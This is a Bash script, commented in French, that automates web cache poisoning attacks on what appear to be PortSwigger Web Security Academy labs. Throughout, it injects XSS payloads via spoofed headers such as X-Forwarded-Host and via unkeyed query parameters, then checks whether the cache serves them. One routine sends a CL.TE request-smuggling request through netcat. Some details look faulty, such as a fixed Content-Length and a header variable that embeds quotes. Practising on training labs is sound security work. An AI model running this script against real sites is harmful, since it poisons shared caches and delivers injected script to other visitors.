#!/bin/bash

LAB_URL="https://YOUR-LAB-ID.web-security-academy.net"
EXPLOIT_SERVER="exploit-server.net" # À personnaliser si besoin
COOKIE="session=..."                # Si besoin
HEADERS="-H 'Cookie: $COOKIE'"

# Tableau de payloads variables
PAYLOADS=(
    "alert(document.cookie)"
    "<script>alert(1)</script>"
    "poisoned-by-cache"
    "xss-test"
)

# Utilitaire pour vérifier la présence du payload dans la réponse
check_payload() {
    local url="$1"
    local payload="$2"
    curl -s "$url" | grep -q "$payload"
}

# Challenge 1 : Basic Web Cache Poisoning
basic_cache_poisoning() {
    echo "[1] Web Cache Poisoning (basic)"
    headers=("X-Forwarded-Host" "X-Host" "X-Original-URL")
    params=("cb" "cachebuster" "utm_content")
    found=0

    for payload in "${PAYLOADS[@]}"; do
        for header in "${headers[@]}"; do
            for param in "${params[@]}"; do
                url="$LAB_URL/?$param=$payload"
                echo "Test: curl -s -H \"$header: $payload\" $HEADERS \"$url\""
                curl -s -H "$header: $payload" $HEADERS "$url" -o /tmp/poison_basic.html
                if grep -q "$payload" /tmp/poison_basic.html; then
                    echo "Payload '$payload' détecté dans la réponse via $header et $param."
                    echo "Empoisonnement du cache..."
                    curl -s -H "$header: $payload" $HEADERS "$url" > /dev/null
                    sleep 2
                    echo "Contrôle :"
                    if check_payload "$LAB_URL" "$payload"; then
                        echo "=> Empoisonnement du cache confirmé avec payload '$payload' !"
                        found=1
                        break 3
                    fi
                fi
            done
        done
        [ $found -eq 1 ] && break
    done
    [ $found -eq 0 ] && echo "=> Aucun vecteur d'injection efficace trouvé avec les payloads testés."
}

# Challenge 2 : Multi-Header Cache Poisoning
multi_header_poisoning() {
    echo "[2] Web Cache Poisoning with multiple headers"
    headers1=("X-Forwarded-Host" "X-Forwarded-Scheme")
    headers2=("X-Original-URL" "X-Forwarded-Server")
    params=("cb" "utm_source")
    found=0

    for payload in "${PAYLOADS[@]}"; do
        for h1 in "${headers1[@]}"; do
            for h2 in "${headers2[@]}"; do
                for param in "${params[@]}"; do
                    url="$LAB_URL/?$param=$payload"
                    echo "Test: curl -s -H \"$h1: $payload\" -H \"$h2: $payload\" $HEADERS \"$url\""
                    curl -s -H "$h1: $payload" -H "$h2: $payload" $HEADERS "$url" -o /tmp/poison_multi.html
                    if grep -q "$payload" /tmp/poison_multi.html; then
                        echo "Payload '$payload' détecté dans la réponse via $h1 + $h2 et $param."
                        echo "Empoisonnement du cache..."
                        curl -s -H "$h1: $payload" -H "$h2: $payload" $HEADERS "$url" > /dev/null
                        sleep 2
                        echo "Contrôle :"
                        if check_payload "$LAB_URL" "$payload"; then
                            echo "=> Empoisonnement multi-header confirmé avec payload '$payload' !"
                            found=1
                            break 4
                        fi
                    fi
                done
            done
        done
        [ $found -eq 1 ] && break
    done
    [ $found -eq 0 ] && echo "=> Aucun vecteur d'injection efficace trouvé avec les payloads testés."
}

# Challenge 3 : Cache Poisoning via Request Smuggling (nécessite netcat)
smuggling_cache_poisoning() {
    echo "[3] Web Cache Poisoning via Request Smuggling"
    host=$(echo $LAB_URL | cut -d/ -f3)
    found=0

    for payload in "${PAYLOADS[@]}"; do
        smuggle_req="POST / HTTP/1.1\r\nHost: $host\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: $EXPLOIT_SERVER\r\nX-Injected: $payload\r\n\r\n"
        echo -e "Envoi de la requête smuggling avec payload '$payload' via netcat :"
        echo -e "$smuggle_req" | nc $host 80 > /dev/null
        sleep 2
        echo "Contrôle :"
        if check_payload "$LAB_URL" "$payload"; then
            echo "=> Empoisonnement via smuggling confirmé avec payload '$payload' !"
            found=1
            break
        fi
    done
    [ $found -eq 0 ] && echo "=> Aucun payload n'a permis l'empoisonnement via smuggling."
}

# Challenge 4 : Unkeyed Parameter Cache Poisoning
unkeyed_param_poisoning() {
    echo "[4] Web Cache Poisoning via unkeyed parameter"
    params=("utm_content" "utm_campaign" "ref")
    found=0

    for payload in "${PAYLOADS[@]}"; do
        for param in "${params[@]}"; do
            url="$LAB_URL/?$param=$payload"
            echo "Test: curl -s $HEADERS \"$url\""
            curl -s $HEADERS "$url" -o /tmp/unkeyed_param.html
            if grep -q "$payload" /tmp/unkeyed_param.html; then
                echo "Payload '$payload' détecté dans la réponse via $param."
                echo "Empoisonnement du cache..."
                curl -s $HEADERS "$url" > /dev/null
                sleep 2
                echo "Contrôle :"
                if check_payload "$LAB_URL" "$payload"; then
                    echo "=> Empoisonnement confirmé via $param avec payload '$payload' !"
                    found=1
                    break 2
                fi
            fi
        done
        [ $found -eq 1 ] && break
    done
    [ $found -eq 0 ] && echo "=> Aucun paramètre non-clé n'a permis l'empoisonnement avec les payloads testés."
}

# Menu principal
main_menu() {
    echo
    echo "PortSwigger Web Cache Poisoning Challenges (payloads variables)"
    echo "-------------------------------------------------------------------"
    echo "1. [1] Web Cache Poisoning (basic)"
    echo "2. [2] Web Cache Poisoning with multiple headers"
    echo "3. [3] Web Cache Poisoning via Request Smuggling"
    echo "4. [4] Web Cache Poisoning via unkeyed parameter"
    echo "q. Quit"
    echo
    read -p "Choisissez un challenge (1-4, q pour quitter) : " choix

    case $choix in
        1) basic_cache_poisoning; main_menu ;;
        2) multi_header_poisoning; main_menu ;;
        3) smuggling_cache_poisoning; main_menu ;;
        4) unkeyed_param_poisoning; main_menu ;;
        q) echo "Sortie." ;;
        *) echo "Choix invalide."; main_menu ;;
    esac
}

main_menu
